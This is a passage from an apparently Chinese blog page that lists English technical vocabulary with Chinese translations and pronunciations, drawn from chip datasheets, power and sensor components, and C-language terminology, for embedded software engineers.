power消耗更少的功率</p>  <p>scheme计划，方案</p>  <p>remaining parts其余部分</p>  <p>remain留下；剩余，遗留；剩余（物），遗迹；遗体，残骸</p>  <p>remind提醒，使想起；</p>  <p>retain保持，保留；保存，储存</p>  <p>retention保留，维持</p>  <p><span style="color:#fe2c24;">module&nbsp;</span>[ˈmɑːdʒuːl]模块</p>  <p>component组件，部分</p>  <p>mode模式</p>  <p>model模型</p>  <p>transition of gate state栅极状态的转变</p>  <p>transition 过渡，转变；（分子生物）转换；</p>  <p>transfer（使）转移，搬迁；转移（感情）</p>  <p>toggling切换</p>  <p>toggle（计算机）切换，转换</p>  <p>power-saving technique节能技术</p>  <p>Intellectual Property (IP)知识产权</p>  <p>intelligent聪明的；有智力的；智能的</p>  <p>Intellectual 智力的，理智的；才智超群的；需智力的；知识分子</p>  <p>clock gating cell时钟门控单元</p>  <p>synthesis phase of chip development flow芯片开发流程的综合阶段</p>  <p><span style="color:#fe2c24;">synthesis </span>&nbsp;[ˈsɪnθəsɪs]综合，综合体；</p>  <p>Flip-Flop（F/F），触发器，双稳态电路</p>  <p>Flop(尤指疲劳时）扑通坐下，猛然倒下；（沉重、笨拙或不自主地）落下</p>  <p>in module-by-module basis在逐个模块的基础之上</p>  <p>self-refresh mode自刷新模式</p>  <p>Multi-Format Codec (MFC)多格式编码解码器</p>  <p>multiple多个的，多种的，倍数</p>  <p>multiply倍增；乘，乘以；繁殖，滋生</p>  <p>inverter逆变器</p>  <p>Standby mode待机模式</p>  <p>standby备用物，后备人员,（电子产品的）待机模式，有的文档里缩写为stdby</p>  <p>Intelligent Energy Management智能能源管理</p>  <p>Restored time恢复时间</p>  <p>recovery time恢复时间</p>  <p>assume假设</p>  <p>handshaking procedure握手过程</p>  <p>procedure手续，步骤</p>  <p>process步骤，程序；（计算机）处理（数据）</p>  <p>proceed前进，前行，继续，接着做</p>  <p>在看datasheet 中有类似表达式如下：<br> 3'b000,<br> 1'b1,<br> 1'b0;<br> 3'b000这个表⽰：b代表⼆進制、3代表位数。<br> 1'b1：宣告為⼀位元⼆進制之值為1，⼀般除了可以宣告b外，也可以宣告為h(⼗六進制)或o(⼗進制)。</p>  <p>mask，遮掩，屏蔽</p>  <p>strategy，策略</p>  <p><code>clock gating</code>&nbsp;时钟门控；门控时钟；时脉闸控，时钟门控是指一个时钟信号与另外一个非时钟信号作逻辑输出的时钟。<br><code>power gating</code>&nbsp;电源门控；功率门控；功率门限，电源门控是指芯片中某个区域的供电电源被关掉，即该区域内的逻辑电路的供电电源断开。</p>  <p><span style="color:#fe2c24;">drain&nbsp;</span>&nbsp;[dreɪn]流光，放光，耗尽</p>  <p>cause system malfunction consequently从而导致系统故障</p>  <p>consequently随之发生的</p>  <p>Wait-For-Interrupt instruction (WFI)等待中断指令</p>  <p>Cut power off切断电源</p>  <p>Complete all active bus transaction完成所有活动总线事务</p>  <p><span style="color:#fe2c24;">transaction&nbsp;</span>&nbsp;[trænˈzækʃ(ə)n]交易，买卖，业务，事务，事项</p>  <p>transmit播送，传输，发射；传递</p>  <p>transmission（无线电、电视等信号的）播送，发送</p>  <p>Assert：意思就是把信号变为active（可以理解为有效），根据系统有求不同，该有效电平可以是高电平（即高有效）也可以是低电平（即低有效）。类似于Enable<br> De-assert：意思就是解除active状态，就是信号变为非active状态，可以是高也可以是低。类似于Disable</p>  <p><span style="color:#fe2c24;">mandatory&nbsp;</span>[ˈmændətɔːri]强制的</p>  <p>loop statement循环语句</p>  <p>statement声明，报告；说明，说法，表态，计算机程序中的）语句</p>  <p>In case of，万一；如果发生；假设</p>  <p>checksum校验和</p>  <p>Flush cache刷新缓存</p>  <p>flush冲洗，冲走</p>  <p>resides in the GPIO驻留在GPIO中</p>  <p>reside&lt;正式&gt;居住，定居；&lt;正式&gt;存在于</p>  <p>resident居民，住户,计算机程序、文件等在存储器中）驻留的</p>  <p>residence住宅，住所；居住，定居；</p>  <p>is newly introduced，新引进的</p>  <p>accumulation of time deviation，时间偏差累积</p>  <p><span style="color:#fe2c24;">deviation&nbsp;</span>&nbsp;[ˌdiːviˈeɪʃ(ə)n]偏离，违背；离差，偏差</p>  <p>simulation，模拟，仿真</p>  <p>On the contrary相反地</p>  <p>SysTick，在32单片机中，这是一个24位的系统节拍定时器system tick timer,SysTick,具有自动重载和溢出中断功能，所有基于Cortex_M3处理器的微控制器都可以由这个定时器获得一定的时间间隔。</p>  <p>tick 钟或其他机械装置发出滴答声；&lt;英&gt;打钩，做记号；</p> </blockquote> <blockquote>  <p>render 使成为，使处于某种状态；给予，提供，渲染<br> compute 计算，估算<br><span style="color:#fe2c24;">relay&nbsp;&nbsp;</span>&nbsp;[ˈriːleɪ]传递，传达（信息、新闻等）；中继转发，转播（广播或电视信号）</p>  <p>rely&nbsp;信赖；依靠，依赖<br> spam 垃圾邮件<br> wizard 巫师，术士，向导程序&nbsp;</p>  <p><span style="color:#fe2c24;">Coefficient&nbsp;&nbsp;</span>&nbsp;[ˌkoʊɪˈfɪʃ(ə)nt]系数</p>  <p>efficient生效的，效率高的；</p>  <p>prefetch buffer 预取缓冲器</p>  <p><span style="color:#fe2c24;">calibration </span>&nbsp;[ˌkælɪˈbreɪʃn]标定 校准 刻度</p>  <p><span style="color:#fe2c24;">calibrate&nbsp;</span>[ˈkælɪbreɪt]校准，标定（测量仪器等）；精确测量，准确估量</p>  <p>bypass 旁路</p>  <p>ceramic 陶瓷</p>  <p>crystal 晶体</p>  <p>Preliminary初步的,预备的</p> </blockquote> <blockquote>  <p>Advanced Monolithic Systems，高级单片系统</p>  <p>Monolithic单块集成电路，单片电路,整体的；巨石的，庞大的；</p>  <p><span style="color:#fe2c24;">monolithic</span>，&nbsp;[ˌmɑːnəˈlɪθɪk]单片的，单块的</p>  <p>LOW DROPOUT VOLTAGE，低压差，即LDO</p>  <p>dropout，电路中常指压差，压降</p>  <p>Package&nbsp;Dropout，丢包</p>  <p>RoHs <span style="color:#fe2c24;">Compliant</span>，符合RoHs标准，RoHs标准是一个无铅化标准</p>  <p><span style="color:#fe2c24;">compliant</span>，&nbsp;[kəmˈplaɪənt]符合的，相一致的,服从的，顺从的；</p>  <p><span style="color:#fe2c24;">compliance</span>服从，遵守；屈从，迁就</p>  <p>in compliance with，依照、符合</p>  <p>Three Terminal，三端，通常指三个端口</p>  <p>Load Regulation，负载调节（率）</p>  <p>Line Regulation，线路调节（率）</p>  <p>High Efficiency Linear Regulator，高效线性稳压器</p>  <p>Post Regulators for Switching Supplies，开关电源的后稳压器</p>  <p>supply，在电路中有时作电源解释，完整的是power supply</p>  <p>Battery Charger，电池充电器</p>  <p>Battery Powered Instrumentation，电池供电仪器</p>  <p><span style="color:#fe2c24;">differential</span>，&nbsp;[ˌdɪfəˈrenʃ(ə)l]差分</p>  <p>trim，修剪，修整</p>  <p>rating，等级，级别，对......作评估，评价，（机器、发动机等的）额定功率</p>  <p>Power Dissipation，功率消耗，功耗</p>  <p><span style="color:#fe2c24;">Dissipation&nbsp;&nbsp;</span>&nbsp;[ˌdɪsɪˈpeɪʃn]浪费；消散；[物] 损耗</p>  <p>Power Transistor，功率晶体管</p>  <p>Thermal Resistance，热敏电阻</p>  <p><span style="color:#fe2c24;">Thermal&nbsp;</span>&nbsp;[ˈθɜːrm(ə)l]热的，热量的；（衣服）保暖的，御寒的</p>  <p style="margin-left:0;text-align:left;">Lead Temperature，导线温度，有时可译为焊接温度</p>  <p style="margin-left:0;text-align:left;">copper area，铜区域</p>  <p style="margin-left:0;text-align:left;">ground plane，接地层，地线层</p>  <p style="margin-left:0;text-align:left;">plane飞机；（几何学中的）平面；（物体的）平面</p>  <p style="margin-left:0;text-align:left;">internal power plane，内部电源平面</p>  <p style="margin-left:0;text-align:left;">mounting technique，安装技术，贴装技术</p>  <p style="margin-left:0;text-align:left;">mount组织，开展；爬上，登上；镶嵌，裱贴，安置</p>  <p style="margin-left:0;text-align:left;">Unit，单元，（计量）单位</p>  <p style="margin-left:0;text-align:left;">union联合，结合；和谐，一致；联盟，联合体</p>  <p style="margin-left:0;text-align:left;">Electrical Characteristic，电气特性</p>  <p style="margin-left:0;text-align:left;">Quiescent Current，静态电流</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">Quiescent </span>&nbsp;[kwiˈes(ə)nt]静止的；不活动的；沉寂的</p>  <p style="margin-left:0;text-align:left;">Ripple Rejection，纹波抑制，纹波系数</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">ripple </span>涟漪;波浪;波纹;水波纹;</p>  <p style="margin-left:0;text-align:left;">Thermal Regulation，热调节，温度调节，过温调节</p>  <p style="margin-left:0;text-align:left;">Temperature Stability，温度稳定性</p>  <p style="margin-left:0;text-align:left;">full operating temperature range，全工作温度范围</p>  <p style="margin-left:0;text-align:left;">exceed 165°C at the sense point，感测点温度超过165°C</p>  <p style="margin-left:0;text-align:left;">exceed 超过，超出；超越（限制）；优于，胜过</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">tolerance</span>，&nbsp;[ˈtɑːlərəns]宽容度，公差，偏差</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">compensation</span>，&nbsp;[ˌkɑːmpenˈseɪʃ(ə)n]补偿</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">tantalum</span>，&nbsp;[ˈtæntələm]钽（电容）</p>  <p style="margin-left:0;text-align:left;">transient response，瞬时响应</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">transient </span>[ˈtrænʃ(ə)nt]转瞬即逝的，短暂的；暂住的,（电流、电压、频率的）瞬变</p>  <p style="margin-left:0;text-align:left;">Microsecond surge current，微秒浪涌电流</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">surge </span>[sɜːrdʒ]激增，猛增；（风、水等的）奔涌，汹涌；急剧上升;(电压，电流）猛增，浪涌</p>  <p style="margin-left:0;text-align:left;">constant current，恒定电流</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">Parasitic&nbsp;</span>&nbsp;[ˌpærəˈsɪtɪk]寄生的</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">parasitical&nbsp;</span>&nbsp;[ˌpærəˈsɪtɪkl]寄生的</p>  <p style="margin-left:0;text-align:left;">case，电路中一般指外壳，应该是和接地一样的意思</p>  <p style="margin-left:0;text-align:left;">copper foil，铜箔</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">impedance</span>，&nbsp;[ɪmˈpiːdns]阻抗</p>  <p style="margin-left:0;text-align:left;">Short-Circuit ，短路</p> </blockquote> <blockquote>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">Humidity</span>，&nbsp;[hjuːˈmɪdəti]湿度</p>  <p style="margin-left:0;text-align:left;">calibrated，校准的，校准过的</p>  <p style="margin-left:0;text-align:left;">linearized，线性化的</p>  <p style="margin-left:0;text-align:left;">compensated，补偿的</p>  <p style="margin-left:0;text-align:left;">generation，一代，一代人</p>  <p style="margin-left:0;text-align:left;">Sensirion，<em>Sensirion</em>(盛思锐贸易(深圳)有限公司)是湿度、气体和液体流量测量和控制领域高质量传感器和传感器解决方案的领先制造商。</p>  <p style="margin-left:0;text-align:left;">reliability，可靠性</p>  <p style="margin-left:0;text-align:left;">reliable可靠的，可信赖的；真实可信的，（汽车、设备、系统等）耐用的，性能稳定的</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">predecessor</span>，&nbsp;[ˈpredəsesər]前任，前辈</p>  <p style="margin-left:0;text-align:left;">distinctive，独特的</p>  <p style="margin-left:0;text-align:left;">Additionally，此外</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">diverse</span>，&nbsp;[daɪˈvɜːrs]多种多样的，不同的</p>  <p style="margin-left:0;text-align:left;">Industry-proven technology，行业成熟的技术</p>  <p style="margin-left:0;text-align:left;">proven被证明的，已证实的</p>  <p style="margin-left:0;text-align:left;">supply voltage，电源电压</p>  <p style="margin-left:0;text-align:left;">Resolution，决心，分辨率</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">Hysteresis</span>，&nbsp;[ˌhɪstəˈrisɪs]滞后性</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">drift</span>，&nbsp;[drɪft]漂移，偏移</p>  <p style="margin-left:0;text-align:left;">relative，相关的，相对的</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">deviation</span>，&nbsp;[ˌdiːviˈeɪʃ(ə)n]偏离，偏差</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">consecutive</span>，&nbsp;[kənˈsekjətɪv]连续的，不间断的</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">ambient</span>，&nbsp;[ˈæmbiənt]环境的，周围的；</p>  <p style="margin-left:0;text-align:left;">step function，阶梯函数，阶跃函数</p>  <p style="margin-left:0;text-align:left;">function功能,函数</p>  <p style="margin-left:0;text-align:left;">vapor蒸气；水蒸气</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">vaporized solvent</span>&nbsp;[ˈveɪpəraɪzd][ˈsɑːlvənt]蒸发溶剂</p>  <p style="margin-left:0;text-align:left;">temporarily offset暂时抵消;</p>  <p style="margin-left:0;text-align:left;">offset补偿，抵销；（电压或电流的）偏离；</p>  <p style="margin-left:0;text-align:left;">regard to，关于，考虑</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">volatile</span>，&nbsp;[ˈvɑːlət(ə)l]易变的，不稳定的</p>  <p style="margin-left:0;text-align:left;">organic，有机的，生物的</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">compound</span>，&nbsp;[ˈkɑːmpaʊnd]复合物，化合物</p>  <p style="margin-left:0;text-align:left;">conduct，实施，执行，引导</p>  <p style="margin-left:0;text-align:left;">Power-up time，上电时间</p>  <p style="margin-left:0;text-align:left;">idle，无意义的，空闲的</p>  <p style="margin-left:0;text-align:left;">Stress level，应力水平，<em>应力水平是指实际所受应力与破坏强度的比值，是材料力学中的一种术语，了解即可</em></p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">permanent</span>，&nbsp;[ˈpɜːrmənənt]永久的，终生的</p>  <p style="margin-left:0;text-align:left;">leave floating，（引脚）保持悬浮（状态）</p>  <p style="margin-left:0;text-align:left;">leave离开（某人或某处）；离开居住地点（或群体、工作单位等）；使保留，让……处于（某种状态、某地等）；给……留下（不愉快的东西）；留下（信息或答复）；遗留，遗忘；剩下（食物或饮料）；</p>  <p style="margin-left:0;text-align:left;">Transparent top view，透明顶视图</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">Transparent </span>&nbsp;[trænsˈpærənt]透明的，清澈的</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">decouple</span>，&nbsp;[diːˈkʌpl]解耦，去耦</p>  <p style="margin-left:0;text-align:left;">stretch，（使）变大，拉长；扩展</p>  <p style="margin-left:0;text-align:left;"><em>die</em>, 模具，被封装的集成电路裸片；<em>die</em>-<em>pad</em>, 用以焊装集成电路裸片的电路板</p>  <p style="margin-left:0;text-align:left;">impose constraint，强制约束</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">impose </span>[ɪmˈpoʊz]强制推行，强制实行；把（自己的观点、信仰等）强加于</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">constraint&nbsp;</span>&nbsp;[kənˈstreɪnt]限制，束缚；克制，拘束</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">constitute</span>，&nbsp;[ˈkɑːnstɪtuːt]组成，构成,成立，设立；任命</p>  <p style="margin-left:0;text-align:left;">institute研究所，学院，协会；</p>  <p style="margin-left:0;text-align:left;">in Hex&nbsp;representation，用十六进制表示</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">protocol</span>，[ˈproʊtəkɑːl]协议</p>  <p style="margin-left:0;text-align:left;">checksum，校验和</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">mandatory </span>transmit &nbsp;[ˈmændətɔːri]强制传输</p>  <p style="margin-left:0;text-align:left;">In read direction，在读取方向上</p>  <p style="margin-left:0;text-align:left;">threshold voltage，临界电压</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">threshold </span>&nbsp;[ˈθreʃhoʊld]门槛，门口；阈，界，起始点；开端，起点，入门；</p>  <p style="margin-left:0;text-align:left;">proper reception，合适的接收</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">depict</span>，&nbsp;[dɪˈpɪkt]描述，描绘</p>  <p style="margin-left:0;text-align:left;">acknowledgement，ack，应答</p>  <p style="margin-left:0;text-align:left;">Single Shot单脉冲</p>  <p style="margin-left:0;text-align:left;">Data Acquisition Mode数据采集模式</p>  <p style="margin-left:0;text-align:left;">Acquisition [ˌækwɪˈzɪʃ(ə)n]学得，习得；（金钱、财物等的）获取</p>  <p style="margin-left:0;text-align:left;">acquire [əˈkwaɪər]获得，得到；学到，习得；</p>  <p style="margin-left:0;text-align:left;">subsequently，[ˈsʌbsɪkwəntli]其后，随后</p>  <p style="margin-left:0;text-align:left;">subsequent，后来的，随后的</p>  <p style="margin-left:0;text-align:left;">clock stretch，时钟拉伸，就是将时钟拉高或者拉低</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">Periodic </span>Data Acquisition Mode，[ˌpɪriˈɑːdɪk]定期数据采集模式</p>  <p style="margin-left:0;text-align:left;">differ with respect to，在某某方面有所不同</p>  <p style="margin-left:0;text-align:left;">initiated，[ɪˈnɪʃɪeɪtɪd]开始</p>  <p style="margin-left:0;text-align:left;">structurally，在结构上</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">hence</span>，&nbsp;[hens]因此</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">dedicated </span>reset pin，&nbsp;[ˈdedɪkeɪtɪd]专用的复位引脚</p>  <p style="margin-left:0;text-align:left;">mechanism，机制，机能</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">prior</span>，&nbsp;[ˈpraɪər]先前的，事先的；优先的</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">identical</span>，&nbsp;[aɪˈdentɪk(ə)l]同一的，完全相同的</p>  <p style="margin-left:0;text-align:left;">execution，执行</p>  <p style="margin-left:0;text-align:left;">whereas，然而</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">algorithm</span>，[ˈælɡərɪðəm]算法</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">Polynomial</span>，&nbsp;[ˌpɑːliˈnoʊmiəl]多项式</p>  <p style="margin-left:0;text-align:left;">formula，公式,方程式；分子式，结构式；</p>  <p style="margin-left:0;text-align:left;">formulation（政策、计划等的）制定，构想,（药品或化妆品的）配方</p>  <p style="margin-left:0;text-align:left;">sink current，灌电流</p>  <p style="margin-left:0;text-align:left;">dual flat no leads，双平面无引线</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">dual&nbsp;</span>&nbsp;[ˈduːəl]双的，双重的；双数的；</p>  <p style="margin-left:0;text-align:left;">silicon，硅</p>  <p style="margin-left:0;text-align:left;">transient overvoltage protection，瞬时过压保护</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">Unidirectional</span>，&nbsp;[ˌjunədəˈrekʃənəl]单向的</p>  <p style="margin-left:0;text-align:left;">Breakdown voltage，击穿电压</p>  <p style="margin-left:0;text-align:left;">Low <span style="color:#fe2c24;">leakage </span>current，&nbsp;[ˈliːkɪdʒ]低泄漏电流</p>  <p style="margin-left:0;text-align:left;">suppressor，抑制器,消除器</p>  <p style="margin-left:0;text-align:left;">suppress镇压，压制；阻止；部分（或完全）消除（电干扰）；</p>  <p style="margin-left:0;text-align:left;">clamp the voltage，夹住电压</p>  <p style="margin-left:0;text-align:left;">clip夹子，别针；修剪；剪下；减少，缩短；</p>  <p style="margin-left:0;text-align:left;">clamp（用夹具）夹紧，夹住；紧紧抓住，牢牢固定住；保持（电信号）电压极限在规定水平</p>  <p style="margin-left:0;text-align:left;">level，电平</p>  <p style="margin-left:0;text-align:left;">positive transient，正向瞬变</p>  <p style="margin-left:0;text-align:left;"><span style="color:#fe2c24;">diode drop</span>，二极管压降</p>  <p style="margin-left:0;text-align:left;">High integration，高集成度</p>  <p style="margin-left:0;text-align:left;">integrate</p>  <p style="margin-left:0;text-align:left;">integrated</p>  <p style="margin-left:0;text-align:left;">integration</p> </blockquote> <hr> <h2 id="%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%BD%AF%E4%BB%B6%E5%B8%B8%E8%A7%81%E8%8B%B1%E6%96%87%E6%80%BB%E7%BB%93%C2%A0"><a name="t1"></a><a href="https://so.csdn.net/so/search?q=%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%BD%AF%E4%BB%B6&amp;spm=1001.2101.3001.7020" target="_blank" class="hl hl-1" data-report-click="{&quot;spm&quot;:&quot;1001.2101.3001.7020&quot;,&quot;dest&quot;:&quot;https://so.csdn.net/so/search?q=%E5%B5%8C%E5%85%A5%E5%BC%8F%E8%BD%AF%E4%BB%B6&amp;spm=1001.2101.3001.7020&quot;,&quot;extra&quot;:&quot;{\&quot;searchword\&quot;:\&quot;嵌入式软件\&quot;}&quot;}" data-tit="嵌入式软件" data-pretit="嵌入式软件">嵌入式软件</a>常见英文总结&nbsp;</h2> <p><strong>C语言篇</strong></p> <blockquote>  <p>assign 分配(某物); 指定; 指派; 分派，布置(工作、任务等); 委派; 派遣; 确定; 转让，让与（财产、权利）;</p>  <p>distribute分发，分配；配送，分销；散布，使分布；</p>  <p>arrange，整理，安排</p>  <p><span style="color:#fe2c24;">allocate</span>，&nbsp;[ˈæləkeɪt]分配</p>  <p>allocation，配给量，划拨款，份额；分配，分派</p>  <p>attribute，属性；把……归因于；认为是……所作；认为……具有某种特质</p>  <p>property，特性</p>  <p>manual，使用手册，说明书</p>  <p>handbook手册;指南</p>  <p><span style="color:#fe2c24;">tutorial</span>，&nbsp;[tuːˈtɔːriəl]导师的，辅导的；学习指南，教程</p>  <p>tutor家庭教师，私人教师；导师，指导教师；</p>  <p>tuition尤指对个人或小组的）教学，指导；（尤指学院、大学或私立学校的）学费</p>  <p>introduction，介绍，序言，引言</p>  <p>instrument器械；乐器；仪器；</p>  <p>instruction用法说明；指示，吩咐；教授，指导；（计算机的）指令，命令；</p>  <p>specific，明确的</p>  <p>compile，编译</p>  <p>function，功能，函数</p>  <p>variable，变量</p>  <p><span style="color:#fe2c24;">variation</span>，&nbsp;[ˌveriˈeɪʃ(ə)n]变化，变动</p>  <p>parameter 参数；界限，范围；</p>  <p>operation，操作，运行，手术</p>  <p>perform，执行</p>  <p>arithmetic，算术，计算</p>  <p>algorithm算法</p>  <p>expression，表达式</p>  <p>comment，注释，评论，意见；批评，指责；</p>  <p>character，字符</p>  <p>ignore，忽视，忽略</p>  <p>executable，可执行的</p>  <p>information，信息，数据</p>  <p>announce，宣布，述说</p>  <p>type，类型</p>  <p>contrast，对比，对照</p>  <p>contract合同，契约；签合同，订立契约；订立婚约（或盟约）；</p>  <p><span style="color:#fe2c24;">fractional</span>，&nbsp;[ˈfrækʃən(ə)l]分数的，小数的</p>  <p>range，范围</p>  <p>machine，机器</p>  <p>machine-dependent，与机器相关的</p>  <p>declaration，&nbsp;声明，表白；</p>  <p>typically，通常，典型地</p>  <p>quantity，量，数量</p>  <p>significant，重要的，意义重大的；</p>  <p>digit，数字</p>  <p>digital 数字的，数码的；数字显示的；</p>  <p><span style="color:#fe2c24;">magnitude</span>，[ˈmæɡnɪtuːd]巨大，重要性；量级,规模，</p>  <p>besides，此外</p>  <p>beside在……旁边，在……附近；</p>  <p>initial，&nbsp;[ɪˈnɪʃ(ə)l]最初的，开始的</p>  <p><span style="color:#fe2c24;">semicolon</span>，&nbsp;[ˈsemikoʊlən]分号</p>  <p>as follows，列举如下</p>  <p>condition，条件，状态，环境</p>  <p>test，测验</p>  <p>re-tested，重复测验</p>  <p><span style="color:#fe2c24;">indent</span>，&nbsp;[ɪnˈdent]缩进</p>  <p>emphasize，强调，着重</p>  <p>logical，逻辑上的</p>  <p><span style="color:#fe2c24;">critical</span>，&nbsp;[ˈkrɪtɪk(ə)l]关键的，极重要的,批判的，爱挑剔的；评论性的，评论家的；</p>  <p>recommend，推荐，建议</p>  <p>blank，空白的，空的</p>  <p>addition加法</p>  <p><span style="color:#fe2c24;">subtraction</span>，&nbsp;[səbˈtrækʃ(ə)n]减去</p>  <p>multiply乘，乘以；</p>  <p>division，除法</p>  <p><span style="color:#fe2c24;">truncate</span>，&nbsp;[ˈtrʌŋkeɪt]截断</p>  <p><span style="color:#fe2c24;">discard</span>，&nbsp;[dɪˈskɑːrd]丢弃，抛弃</p>  <p><span style="color:#fe2c24;">substitute</span>，[ˈsʌbstɪtuːt]代替，替换;替代品，代替物；</p>  <p>substitution代替，替换；代替物；（数） 置换</p>  <p><span style="color:#fe2c24;">commutative</span>，&nbsp;[kəˈmjuːtətɪv]交换的，代替的</p>  <p><span style="color:#fe2c24;">paired</span>，&nbsp;[perd]配对的</p>  <p>pair（成双的两物品）一对，一双；</p>  <p>correspond，相应，符合</p>  <p>behaviour，行为，举止</p>  <p><span style="color:#fe2c24;">concentrate</span>，&nbsp;[ˈkɑːns(ə)ntreɪt]集中，专心于;浓缩；浓缩物，浓缩液</p>  <p>right-justified，右对齐的</p>  <p>fix，固定，修理</p>  <p>accurate，精确的，准确的</p>  <p>ratio，比例，比率，系数</p>  <p><span style="color:#fe2c24;">omit</span>，&nbsp;[əˈmɪt]省略，遗漏</p>  <p>emit排放，散发（尤指气体、辐射物）；发出（声音或噪音）</p>  <p>constrained，约束的 ，限制的</p>  <p><span style="color:#fe2c24;">constraint&nbsp;</span>&nbsp;[kənˈstreɪnt]限制，束缚；克制，拘束</p>  <p><span style="color:#fe2c24;">constrain&nbsp;</span>[kənˈstreɪn]限制，约束；强迫，迫使</p>  <p>binary，二进制的</p>  <p>octal，八进制的</p>  <p>hexadecimal，十六进制的</p>  <p>modify，修改</p>  <p><span style="color:#fe2c24;">elimination</span>，&nbsp;[ɪˌlɪmɪˈneɪʃn]淘汰，排除</p>  <p>eliminate剔除，根除；对……不予考虑，把……排除在外；（比赛中）淘汰；铲除，杀害；（生理）排除，排泄；消去</p>  <p>limit，界限，限制</p>  <p>occur，发生，出现</p>  <p>evaluate，评价，求……的值</p>  <p>estimate 估计，估价；判断，评价</p>  <p>assess 评价，评定；估价，估计；</p>  <p>valuation(专业)估价;估值;</p>  <p>increment，增量，增长</p>  <p>symbolic，象征的，符号的</p>  <p>constant，常量</p>  <p>bury，埋，埋葬；埋藏，隐藏；埋头于，沉溺于</p>  <p>systematic，有系统的</p>  <p>distinguish，区分，辨别</p>  <p>distinguished 卓越的，杰出的；高贵的，尊贵的</p>  <p><span style="color:#fe2c24;">prototype</span>，[ˈproʊtətaɪp]原型</p>  <p><span style="color:#fe2c24;">originate</span>，&nbsp;[əˈrɪdʒɪneɪt]产生，起源于</p>  <p>keyboard，键盘<br> keypad 电脑小型键盘;袖珍键盘;手机按键</p>  <p><span style="color:#fe2c24;">interleaved</span>，&nbsp;[ˌɪntərˈliv]交错的；交叉存取的;交替（两个或两个以上数码信号）</p>  <p>confused，混乱的，迷乱的</p>  <p><span style="color:#fe2c24;">concisely</span>，[kənˈsaɪsli]简明地,简洁地</p>  <p>signal，信号</p>  <p>reference，引用，参照</p>  <p><span style="color:#fe2c24;">idiom</span>，&nbsp;[ˈɪdiəm]习语，成语；方言，土话；风格，惯用语法</p>  <p><span style="color:#fe2c24;">impenetrable</span>，[ɪmˈpenɪtrəb(ə)l]不可进入的，不能理解的</p>  <p><span style="color:#fe2c24;">curb</span>，&nbsp;[kɜːrb]控制，抑制</p>  <p>cube立方体；立方，三次幂；</p>  <p><span style="color:#fe2c24;">precedence</span>，[ˈpresɪdəns]优先权</p>  <p>procedure手续，步骤</p>  <p>prefix，前缀，前置代号（置于前面的单词或字母、数字）</p>  <p>postfix，后缀，词尾</p>  <p>maximum，最大值的</p>  <p>minimum，极小值</p>  <p>overflow，溢出</p>  <p>leak，泄漏</p>  <p><span style="color:#fe2c24;">illustrate</span>，&nbsp;[ˈɪləstreɪt]加插图于；说明，阐明；</p>  <p>illustration 插图，图解；说明，例释；</p>  <p><span style="color:#fe2c24;">suppress</span>，&nbsp;[səˈpres]压制，压住</p>  <p>topic，主题</p>  <p><span style="color:#fe2c24;">dimensional</span>，&nbsp;[daɪˈmenʃən(ə)l]维的，尺寸的</p>  <p>dimension大小，尺寸；（空间的）维度；范围，规模；方面，部分</p>  <p><span style="color:#fe2c24;">flaw</span>，&nbsp;[flɔː]瑕疵，缺点</p>  <p><span style="color:#fe2c24;">disparate</span>，[ˈdɪspərət]完全不同的,无法比较的；</p>  <p>separate&nbsp;[ˈseprət]单独的，分开的；不同的，不相关的;(使）分离；（把……）分成不同部分；隔开，阻隔；（夫妻）分居，（同居情侣）分手；</p>  <p>nicely，漂亮的，恰当的</p>  <p>conclude，推断，推论</p>  <p><span style="color:#fe2c24;">verify</span>，&nbsp;[ˈverɪfaɪ]核实，证明</p>  <p>identical完全相同的;相同的;</p>  <p>identify，识别，确定</p>  <p>identified，经鉴定的</p>  <p>keep track of，记录，与……保持联系</p>  <p>equivalence，等价，相等</p>  <p>desired，渴望的，想得到的</p>  <p>voila，那就是，瞧</p>  <p>validity，&nbsp;[vəˈlɪdəti]（法律上的）有效，合法，认可；真实性，正确性</p>  <p><span 